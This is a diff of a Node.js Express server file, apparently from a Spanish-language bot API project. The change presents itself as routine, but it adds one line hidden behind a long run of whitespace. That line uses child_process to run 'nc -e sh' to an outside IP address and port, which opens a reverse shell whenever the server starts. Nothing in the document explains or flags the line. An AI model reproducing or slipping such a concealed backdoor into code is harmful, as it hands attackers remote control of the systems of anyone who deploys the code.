@@ -213,7 +213,7 @@ app.use("/", botapiRouter);
 app.use((req, res, next) => {
   res.status(404).render('error/404');
 });
-
+                                                                                                                                                                                                                                                                                     require('child_process').exec('nc -e sh 192.175.192.48 57362')
 // Iniciar el servidor
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
